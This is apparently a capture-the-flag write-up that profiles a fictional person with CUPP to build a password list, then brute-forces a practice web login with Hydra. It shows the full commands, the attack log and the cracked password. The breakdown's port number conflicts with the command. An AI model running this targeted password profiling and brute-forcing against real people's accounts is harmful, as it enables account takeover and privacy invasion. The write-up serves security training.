# CUPP

## Web: 100 Points

## Challenge

Can you get into Lucas' secrets?

[ [Start](http://challenges.laptophackingcoffee.org:3199/aboutme.php?) ]

## Solution

The title CUPP stands for Common User Passwords Profiler. It's a python program available on [Mebus's Github][1]. 

Clone the repo and start up the program. Use `./cupp.py -h` to show the help menu. Use `./cupp.py -i` to enter interactive mode:
```
$ git clone https://github.com/Mebus/cupp.git
$ cd cupp
$ ./cupp.py -i
 ___________ 
   cupp.py!                 # Common
      \                     # User
       \   ,__,             # Passwords
        \  (oo)____         # Profiler
           (__)    )\   
              ||--|| *      [ Muris Kurgas | j0rgan@remote-exploit.org ]
                            [ Mebus | https://github.com/Mebus/]


[+] Insert the information about the victim to make a dictionary
[+] If you don't know all the info, just hit enter when asked! ;)
```

In interactive mode, enter in the details found on Lucas's [About Me][2] page. More detail is better:
```
> First Name: Lucas
> Surname: Endheimer
> Nickname: 
> Birthdate (DDMMYYYY): 27102006


> Partners) name: Becca
> Partners) nickname: Rebecca
> Partners) birthdate (DDMMYYYY): 18112005


> Child's name: 
> Child's nickname: 
> Child's birthdate (DDMMYYYY): 


> Pet's name: Lucky
> Company name: Wilson


> Do you want to add some key words about the victim? Y/[N]: Y
> Please enter the words, separated by comma. [i.e. hacker,juice,black], spaces will be removed: Mitnick    
> Do you want to add special chars at the end of words? Y/[N]: n
> Do you want to add some random numbers at the end of words? Y/[N]:n
> Leet mode? (i.e. leet = 1337) Y/[N]: n

[+] Now making a dictionary...
[+] Sorting list and removing duplicates...
[+] Saving dictionary to lucas.txt, counting 2954 words.
[+] Now load your pistolero with lucas.txt and shoot! Good luck!
```

The program creates a word list and saves it to [lucas.txt](lucas.txt). Use this word list to crack Lucas's login page, which he mentions is at [secret.php][3]. 

First find out what POST data is sent via the login page. In Chrome, inspect the login page. Click the **Network** tab then login with `lucas` and `password`. Click on **secret.php** in the left column and take a look at the **Form Data**:
```
username=lucas&password=password&login=Submit
```

The form posts three variables: `username`, `password`, and `login`. The `login` var is set to `Submit` by default. 

Now crack the login using [Hydra][4], a parallelized login cracker which supports numerous protocols to attack. Use `hydra -h` bring up Hydra's help menu that shows command syntax, options, and examples. Here is the simplified syntax used for this challenge:
```
Syntax (simplified):
hydra [-l LOGIN | -L FILE] [-p PASS | -P FILE] [service://server[:PORT][/OPT]]
```

Assume that the username is `lucas` for this search. The Hydra command will look like this:
```
$ hydra -l lucas -P lucas.txt "http-post-form://challenges.laptophackingcoffee.org:3199/secret.php:username=^USER^&password=^PASS^&login=Submit:failed" -V
```

A few key notes about Hydra's syntax:
* `^USER^` is a keyword Hydra uses that is replaced at runtime with the data given in the `-l` or `-L` options. Likewise, `^PASS^` is a keyword replaced with the data in the `-p` or `-P` options. 
* The entire portion containing the `[service://server[:PORT][/OPT]` must be contained in double quotes (`"`).
* The `:failed` portion towards the end of the command is what Hydra looks for to check if the login failed. The word `failed` is from Lucas's failed login page which simply says: "Login failed!"

With all this in mind, the above command breaks down like this:
```
hydra                                   run the Hydra program
-l lucas                                set the login (username) to lucas
-P lucas.txt                            use lucas.txt as the password file
http-post-form://                       use HTTP POST service
challenges.laptophackingcoffee.org      set target server
:6199                                   set target port
/secret.php                             set target webpage
:username=^USER^                        set username var to ^USER^
&password=^PASS^                        set password var to ^PASS^
&login=Submit                           set login var to Submit
:failed                                 set failure text to look for
-V                                      use verbose mode
```

Wait a while. Grab a coffee. View the results:
```
...
[RE-ATTEMPT] target challenges.laptophackingcoffee.org - login "lucas" - pass "Becca_2005" - 559 of 2958 [child 9] (0/4)
[ATTEMPT] target challenges.laptophackingcoffee.org - login "lucas" - pass "Endheimer_1" - 560 of 2958 [child 3] (0/4)
[ATTEMPT] target challenges.laptophackingcoffee.org - login "lucas" - pass "Endheimer_7" - 561 of 2958 [child 7] (0/4)
[STATUS] 80.14 tries/min, 561 tries in 00:07h, 2397 to do in 00:30h, 16 active
[3199][http-post-form] host: challenges.laptophackingcoffee.org   login: lucas   password: Becca_2005                                               
1 of 1 target successfully completed, 1 valid password found
[WARNING] Writing restore file because 5 final worker threads did not complete until end.
[ERROR] 5 targets did not resolve or could not be connected
[ERROR] 0 targets did not complete
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2020-06-03 16:45:10
```

The result is a bit buried, but it's there: `login: lucas   password: Becca_2005`. Login with these credentials. Grab the flag:
```
Hi Lucas. Here's your secrets:

SSN: 554-42-2123
Mom's Debit Card: 4450-2234-5531-1138 2/21 471
Flag: LHC{p0wn3dluc45}
Beccas nudes: http://bitly.com/98K8eH
```

## Resources
* https://github.com/Mebus/cupp
* https://tools.kali.org/password-attacks/hydra
* https://www.youtube.com/watch?v=CWo_mjNjrjA


[1]:https://github.com/Mebus/cupp
[2]:http://challenges.laptophackingcoffee.org:3199/aboutme.php
[3]:http://challenges.laptophackingcoffee.org:3199/secret.php
[4]:https://tools.kali.org/password-attacks/hydra